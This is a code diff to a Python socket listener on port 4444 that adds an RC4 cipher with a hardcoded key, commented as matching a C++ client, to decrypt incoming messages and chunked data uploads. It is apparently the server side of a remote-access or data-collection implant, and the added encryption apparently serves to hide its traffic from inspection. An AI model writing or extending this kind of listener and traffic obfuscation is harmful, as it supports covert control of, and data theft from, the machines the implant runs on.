@@ -9,9 +9,31 @@ HOST = '0.0.0.0'  # Listen on all interfaces
 PORT = 4444
 LOG_FILE = "blackforest_logs.txt"
 
-import threading
+# RC4 Implementation
+class RC4:
+    def __init__(self, key):
+        self.S = list(range(256))
+        j = 0
+        for i in range(256):
+            j = (j + self.S[i] + key[i % len(key)]) % 256
+            self.S[i], self.S[j] = self.S[j], self.S[i]
+        self.i = 0
+        self.j = 0
+
+    def crypt(self, data):
+        out = []
+        for char in data:
+            self.i = (self.i + 1) % 256
+            self.j = (self.j + self.S[self.i]) % 256
+            self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]
+            out.append(char ^ self.S[(self.S[self.i] + self.S[self.j]) % 256])
+        return bytes(out)
 
 def handle_client(client, addr):
+    # Key: DEADBEEF... (Matches C++ Key)
+    key = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE])
+    cipher = RC4(key)
+
     # print(f"[+] Connection accepted from {addr[0]}:{addr[1]}") # Too spammy
     
     # Log new connection
@@ -24,6 +46,11 @@ def handle_client(client, addr):
     while True:
         try:
             data = client.recv(4096)
+            if not data:
+                break # Client disconnected
+            
+            # Decrypt Traffic
+            data = cipher.crypt(data)
             if not data:
                 break # Client disconnected
             
@@ -48,6 +75,8 @@ def handle_client(client, addr):
                         
                         while collected_len < total_size:
                             chunk = client.recv(4096)
+                            if not chunk: break
+                            chunk = cipher.crypt(chunk) # Decrypt chunk
                             if not chunk: break
                             collected_data += chunk
                             collected_len += len(chunk)
